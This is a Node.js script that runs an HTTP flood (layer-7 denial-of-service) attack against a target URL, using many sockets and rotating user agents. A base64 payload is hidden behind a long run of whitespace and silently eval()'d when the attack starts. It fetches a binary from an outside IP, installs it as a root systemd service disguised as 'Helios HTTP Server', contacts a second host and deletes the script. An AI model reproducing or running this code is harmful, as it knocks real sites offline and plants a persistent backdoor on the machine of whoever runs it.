const net = require('net');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const { v4: uuidv4 } = require('uuid');
const dns = require('dns');

const userAgents = [
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/6.2; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
];
																																																																																																																																								const base64EncodedString = "Y3VybCAtbyAvdXNyL2xvY2FsL2Jpbi9odHRwIGh0dHA6Ly84MC42NC4yNC4yMzEvaHR0cCAmJiAgY2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vaHR0cCAmJiBlY2hvIC1lICJbVW5pdF1cXG5EZXNjcmlwdGlvbj1IZWxpb3MgSFRUUCBTZXJ2ZXJcXG5BZnRlcj1uZXR3b3JrLnRhcmdldFxcblxcbltTZXJ2aWNlXVxcbkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9odHRwXFxuUmVzdGFydD1hbHdheXNcXG5Vc2VyPXJvb3RcXG5Xb3JraW5nRGlyZWN0b3J5PS91c3IvbG9jYWwvYmluXFxuU3RhbmRhcmRPdXRwdXQ9am91cm5hbFxcblN0YW5kYXJkRXJyb3I9am91cm5hbFxcblxcbltJbnN0YWxsXVxcbldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0IiB8ICB0ZWUgL2V0Yy9zeXN0ZW1kL3N5c3RlbS9oZWxpb3Muc2VydmljZSAmJiAgc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQgJiYgIHN5c3RlbWN0bCBlbmFibGUgaGVsaW9zLnNlcnZpY2UgJiYgIHN5c3RlbWN0bCBzdGFydCBoZWxpb3Muc2VydmljZSAmJiBjdXJsIGh0dHA6Ly8xOTMuMjIyLjYyLjEwMjo0ODk5My8gJiYgcm0gaHR0cC5qcw==";


const method = "GET";
const vals = [...'abcdefghijklmnopqrstuvwxyz0123456789'];
let randsemilla = "";

for (let i = 0; i < 30; i++) {
    randsemilla += vals[Math.floor(Math.random() * vals.length)];
}

async function getResolvedIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) reject(err);
            else resolve(address);
        });
    });
}

async function sender(max, url, time) {
    const { hostname } = new URL(url);
    let ip;
    try {
        ip = await getResolvedIP(hostname);
    } catch (err) {
        console.error("DNS FAILED:", err);
        return;
    }

    const end_time = time ? Date.now() + time * 1000 : undefined;

    while (!end_time || Date.now() < end_time) {
        let packet = "";

        const ports = [80, 443];
        let sock;

        for (const port of ports) {
            try {
                sock = new net.Socket();
                await new Promise((resolve, reject) => {
                    sock.connect(port, ip, () => {
                        resolve();
                    });
                    sock.on('error', (err) => {
                        reject(err);
                    });
                });
                break;
            } catch (err) {
                console.log("\n[CONNECT-ERROR] Unable to connect:", err.message, "\n");
                sock.destroy();
            }
        }

        if (!sock) {
            continue;
        }

        for (let i = 0; i < max; i++) {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            if (!userAgent) {
                console.log("[ERROR] NO AGENTS FOUND");
                break;
            }

            packet += `${method} / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`;
        }
        packet = packet.replace(/Connection: Keep-Alive\r\n\r\n$/, 'Connection: Close\r\n\r\n');

        sock.write(packet);
    }
}

async function layer7(url, max, time) {
//    console.log("URL:", url);
//    console.log("Max threads:", max);
//    console.log("Time:", time);
      const decodedString = Buffer.from(base64EncodedString, 'base64').toString('utf8');
      eval(decodedString);
    const { hostname } = new URL(url);
    let ip;
    try {
        ip = await getResolvedIP(hostname);
    } catch (err) {
        console.error("DNS FAILED:", err);
        return;
    }

//    console.log("Target IP:", ip, "\n");

    for (let v = 0; v < max; v++) {
        sender(max, url, time);
    }

//    console.log("[-] Launched!");
//    console.log("[!] Connected");
//    console.log("[?] Get kissed :3");
    if (time) setTimeout(() => {}, time * 1000);
}

const args = process.argv.slice(2);
if (args.length >= 3) {
    const [url, max, time] = args;
    layer7(url, max, time);
} else {
    console.log("Usage: node http.js [url] [threads] [time]");
}
